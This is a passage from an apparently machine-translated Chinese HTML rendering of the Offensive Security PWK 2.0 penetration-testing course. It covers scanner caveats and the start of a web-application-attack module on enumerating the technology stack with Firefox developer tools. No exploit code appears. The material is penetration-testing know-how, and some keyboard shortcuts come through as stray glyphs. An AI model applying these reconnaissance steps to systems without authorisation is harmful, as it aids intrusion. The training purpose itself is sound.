<div style="position:absolute;top:22097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞扫描在渗透测试的初始阶段非常有用。</font><font style="vertical-align: inherit;">一次</font></font></nobr></div>
<div style="position:absolute;top:22117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置正确，漏洞扫描工具可以提供丰富的信息并揭示</font></font></nobr></div>
<div style="position:absolute;top:22136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些严重的和不可预见的漏洞可能会在一个过程中产生重大影响</font></font></nobr></div>
<div style="position:absolute;top:22156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试参与。</font><font style="vertical-align: inherit;">话虽如此，重要的是我们要了解手册</font></font></nobr></div>
<div style="position:absolute;top:22175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仍然需要审查，并且扫描程序只能发现他们编程的漏洞</font></font></nobr></div>
<div style="position:absolute;top:22194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了。</font><font style="vertical-align: inherit;">最后，我们应该始终牢记漏洞扫描工具可以执行操作</font></font></nobr></div>
<div style="position:absolute;top:22214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能对某些网络或目标有害，因此我们在使用时必须谨慎</font></font></nobr></div>
<div style="position:absolute;top:22233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:22747;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="20"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 20 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:22780;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:23857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:23857;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:23857;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">240</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:22870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:22896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9. Web 应用程序攻击</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:22940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将重点介绍常见 Web 应用程序的识别和开发</font></font></nobr></div>
<div style="position:absolute;top:22960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font><font style="vertical-align: inherit;">现代开发框架和托管解决方案简化了流程</font></font></nobr></div>
<div style="position:absolute;top:22979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建和部署基于 Web 的应用程序。</font><font style="vertical-align: inherit;">但是，这些应用程序通常会暴露一个</font></font></nobr></div>
<div style="position:absolute;top:22998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于缺乏成熟的应用程序代码、多个依赖项和</font></font></nobr></div>
<div style="position:absolute;top:23018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全的服务器配置。</font></font></nobr></div>
<div style="position:absolute;top:23050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序可以用多种编程语言和框架编写，每一种</font></font></nobr></div>
<div style="position:absolute;top:23070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能会引入特定类型的漏洞。</font><font style="vertical-align: inherit;">然而，最常见的漏洞</font></font></nobr></div>
<div style="position:absolute;top:23089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无论底层技术堆栈如何，在概念上都是相似的。</font></font></nobr></div>
<div style="position:absolute;top:23122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将讨论 Web 应用程序漏洞枚举和利用。</font><font style="vertical-align: inherit;">虽然</font></font></nobr></div>
<div style="position:absolute;top:23141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞和攻击的复杂性各不相同，我们将展示几种利用</font></font></nobr></div>
<div style="position:absolute;top:23161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OWASP Top 10 列表中列出的常见 Web 应用程序漏洞。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">237</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些攻击向量</font></font></nobr></div>
<div style="position:absolute;top:23180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将作为用于构建更高级攻击的基本构建块。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:23218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.1 Web 应用程序评估方法</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们开始讨论枚举和利用之前，我们将讨论基本的 Web</font></font></nobr></div>
<div style="position:absolute;top:23278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序渗透测试方法。</font></font></nobr></div>
<div style="position:absolute;top:23311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为第一步，我们应该收集有关应用程序的信息。</font><font style="vertical-align: inherit;">应用程序有什么作用？</font></font></nobr></div>
<div style="position:absolute;top:23330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它是用什么语言编写的？</font><font style="vertical-align: inherit;">应用程序在什么服务器软件上运行？</font><font style="vertical-align: inherit;">的答案</font></font></nobr></div>
<div style="position:absolute;top:23350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些和其他基本问题将有助于引导我们走向第一个（或下一个）潜在的攻击媒介。</font></font></nobr></div>
<div style="position:absolute;top:23383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与许多渗透测试学科一样，每次尝试攻击或利用的目标都是</font></font></nobr></div>
<div style="position:absolute;top:23402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在应用程序中增加我们的权限或转向另一个应用程序或目标。</font><font style="vertical-align: inherit;">每个</font></font></nobr></div>
<div style="position:absolute;top:23421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此过程中成功利用可能会授予对新功能或组件的访问权限</font></font></nobr></div>
<div style="position:absolute;top:23441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用。</font><font style="vertical-align: inherit;">我们可能需要成功执行几次漏洞利用才能从一个</font></font></nobr></div>
<div style="position:absolute;top:23460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未经身份验证的用户帐户访问系统上的任何类型的外壳。</font></font></nobr></div>
<div style="position:absolute;top:23493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新功能的枚举在每一步都很重要，特别是因为攻击</font></font></nobr></div>
<div style="position:absolute;top:23512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">先前失败的可能在新的上下文中成功。</font><font style="vertical-align: inherit;">作为渗透测试人员，我们必须继续</font></font></nobr></div>
<div style="position:absolute;top:23532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举并适应，直到我们用尽所有攻击途径或破坏系统。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:23569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2 Web 应用枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:23611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在尝试之前确定组成 Web 应用程序的组件很重要</font></font></nobr></div>
<div style="position:absolute;top:23630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">盲目地利用它。</font><font style="vertical-align: inherit;">许多 Web 应用程序漏洞与技术无关。</font><font style="vertical-align: inherit;">然而，一些</font></font></nobr></div>
<div style="position:absolute;top:23649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用和有效载荷需要根据技术基础进行设计</font></font></nobr></div>
<div style="position:absolute;top:23669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序，例如数据库软件或操作系统。</font><font style="vertical-align: inherit;">在发起任何攻击之前</font></font></nobr></div>
<div style="position:absolute;top:23688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个 Web 应用程序，我们应该尝试发现正在使用的技术堆栈，通常</font></font></nobr></div>
<div style="position:absolute;top:23707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由以下组件组成：</font></font></nobr></div>
<div style="position:absolute;top:23740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:23740;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编程语言和框架</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:23807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">237 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（OWASP，2019），https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:23935;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="21"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 21 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:23968;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:25045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:25045;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:25045;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">241</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:24064;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络服务器软件</font></font></nobr></div>
<div style="position:absolute;top:24092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:24092;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库软件</font></font></nobr></div>
<div style="position:absolute;top:24120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:24120;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器操作系统</font></font></nobr></div>
<div style="position:absolute;top:24153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用多种技术直接从浏览器收集这些信息。</font></font></nobr></div>
<div style="position:absolute;top:24173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数现代浏览器都包含可以协助枚举过程的开发人员工具。</font><font style="vertical-align: inherit;">我们将</font></font></nobr></div>
<div style="position:absolute;top:24192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专注于 Firefox，因为它是 Kali Linux 中的默认浏览器。</font><font style="vertical-align: inherit;">但是，大多数浏览器包括</font></font></nobr></div>
<div style="position:absolute;top:24211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类似的开发者工具。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:24246;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.1 检查 URL</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件扩展名，有时是 URL 的一部分，可以揭示编程语言</font></font></nobr></div>
<div style="position:absolute;top:24303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序是用它编写的。其中一些，如 .php，很简单，但其他扩展名是</font></font></nobr></div>
<div style="position:absolute;top:24322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更加神秘，并且因使用的框架而异。</font><font style="vertical-align: inherit;">例如，基于 Java 的 Web 应用程序</font></font></nobr></div>
<div style="position:absolute;top:24342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用 .jsp、.do 或 .html。</font></font></nobr></div>
<div style="position:absolute;top:24374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，网页上的文件扩展名变得越来越少，因为许多语言和</font></font></nobr></div>
<div style="position:absolute;top:24394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架现在支持</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路由</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的概念</font><font style="vertical-align: inherit;">，它允许开发人员将 URI 映射到一个部分</font></font></nobr></div>
<div style="position:absolute;top:24413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的代码。</font><font style="vertical-align: inherit;">利用路由的应用程序使用逻辑来确定返回给用户的内容</font></font></nobr></div>
<div style="position:absolute;top:24433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并使 URI 扩展在很大程度上无关紧要。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:24467;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.2 检查页面内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:24505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管 URL 检查可以提供有关目标 Web 应用程序的一些线索，但大多数上下文</font></font></nobr></div>
<div style="position:absolute;top:24524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在网页的来源中找到线索。</font><font style="vertical-align: inherit;">Firefox</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具（可在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web</font></font></i></nobr></div>
<div style="position:absolute;top:24544;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发者</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菜单或按</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CB k</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 显示页面的资源和内容，其中</font></font></nobr></div>
<div style="position:absolute;top:24563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因应用而异。</font><font style="vertical-align: inherit;">调试器工具可能会显示 JavaScript 框架、隐藏的输入字段、</font></font></nobr></div>
<div style="position:absolute;top:24583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注释、HTML 中的客户端控件、JavaScript 等等。</font></font></nobr></div>
<div style="position:absolute;top:24615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了证明这一点，我们可以在浏览 www.megacorp.one 的同时打开调试器： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:25123;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="22"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 22 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:25156;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:26233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:26233;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:26233;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">242</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25686;left:277"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 83：使用开发人员工具检查 JavaScript 源</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到在 www.megacorpone.com 上运行的应用程序使用的是 jQuery </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">238</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本 1.11.0，</font></font></nobr></div>
<div style="position:absolute;top:25737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个常见的 JavaScript 库。</font><font style="vertical-align: inherit;">在这种情况下，开发人员</font><font style="vertical-align: inherit;">将代码</font><font style="vertical-align: inherit;">缩小了</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">239</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，使其更加</font></font></nobr></div>
<div style="position:absolute;top:25756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">紧凑和节省资源，但使其有点难以阅读。</font><font style="vertical-align: inherit;">幸运的是，我们可以</font></font></nobr></div>
<div style="position:absolute;top:25776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过单击</font><font style="vertical-align: inherit;">带有双卷曲</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漂亮打印源</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮</font><font style="vertical-align: inherit;">在 Firefox 中“美化”代码</font></font></nobr></div>
<div style="position:absolute;top:25795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大括号：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:26163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">238 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（jQuery，2019），https://jquery.com/</font></font></font></nobr></div>
<div style="position:absolute;top:26183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">239 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Minification_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（编程）</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:26311;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="23"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 23 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:26344;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:27421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:27421;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:27421;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">243</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26703;left:376"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 84：漂亮的打印源</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:26735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击该图标后，Firefox 将以更易于阅读和遵循的格式显示代码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:27031;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 85：在 Firefox 中查看美化源</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inspector</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具深入查看特定页面内容。</font><font style="vertical-align: inherit;">让我们使用 Inspector 来</font></font></nobr></div>
<div style="position:absolute;top:27082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过右键单击电子邮件地址字段，</font><font style="vertical-align: inherit;">检查</font><font style="vertical-align: inherit;">“联系人”页面中</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电子邮件输入</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">元素</font></font></nobr></div>
<div style="position:absolute;top:27101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在页面上并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inspect Element</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或使用快捷方式</font></font><font style="font-size:36px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Q</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:27499;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="24"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 24 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:27532;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:28609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:28609;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:28609;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">244</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:28124;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 86：选择电子邮件输入元素</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将打开 Inspector 工具并突出显示我们右键单击的元素的 HTML。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:28687;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="25"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 25 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:28720;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:29797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:29797;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:29797;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">245</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:29237;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 87：使用检查器工具</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此工具对于快速查找 HTML 源代码中的隐藏表单字段特别有用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:29302;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2.3 查看响应头</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:29340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以搜索服务器响应以获取其他信息。</font><font style="vertical-align: inherit;">我们有两种类型的工具</font></font></nobr></div>
<div style="position:absolute;top:29360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以用来完成这个任务。</font><font style="vertical-align: inherit;">第一种工具是代理，它拦截请求并</font></font></nobr></div>
<div style="position:absolute;top:29379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端和网络服务器之间的响应。</font><font style="vertical-align: inherit;">我们将在本模块的后面探索代理，但首先</font></font></nobr></div>
<div style="position:absolute;top:29399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将探索</font><font style="vertical-align: inherit;">从 Firefox </font><i><font style="vertical-align: inherit;">Web Developer</font></i><font style="vertical-align: inherit;">菜单</font><font style="vertical-align: inherit;">启动</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具</font><font style="vertical-align: inherit;">，以查看 HTTP</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:29418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求和响应。</font><font style="vertical-align: inherit;">此工具显示启动后发生的网络活动，因此我们必须</font></font></nobr></div>
<div style="position:absolute;top:29437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">刷新页面以查看流量​​。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:29875;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="26"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 26 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:29908;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:30985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
